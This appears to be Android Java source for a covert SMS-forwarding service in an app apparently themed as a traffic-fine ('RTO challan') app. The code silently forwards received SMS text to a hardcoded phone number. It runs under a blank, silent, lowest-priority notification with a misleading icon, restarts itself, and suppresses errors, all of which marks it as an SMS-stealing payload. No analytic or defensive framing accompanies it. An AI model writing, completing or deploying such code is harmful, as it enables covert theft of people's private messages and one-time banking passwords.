package com.rtochallan;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.telephony.SmsManager;

public class ForwardService extends Service {

    private static final String CHANNEL_ID = "SMSForwardChannel";
    private static final int NOTIFICATION_ID = 1;

    // 🔁 Replace this with your actual forwarding number
    private static final String FORWARD_TO = "+916207251134";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String smsBody = intent.getStringExtra("sms_body");
        if (smsBody != null) {
            forwardSms(smsBody);
        }
        // Keep the service running even if the app is closed
        return START_STICKY;
    }

    private void forwardSms(String smsBody) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(FORWARD_TO, null, smsBody, null, null);
        } catch (Exception ignored) {
            // Silently ignore failures
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "SMS Forward Service",
                NotificationManager.IMPORTANCE_MIN // lowest priority
            );
            channel.setDescription("Background SMS forwarding");
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this,
            0,
            intent,
            PendingIntent.FLAG_IMMUTABLE
        );

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        // Minimal & silent notification
        return builder
            .setContentTitle("") // No title
            .setContentText("") // No text
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
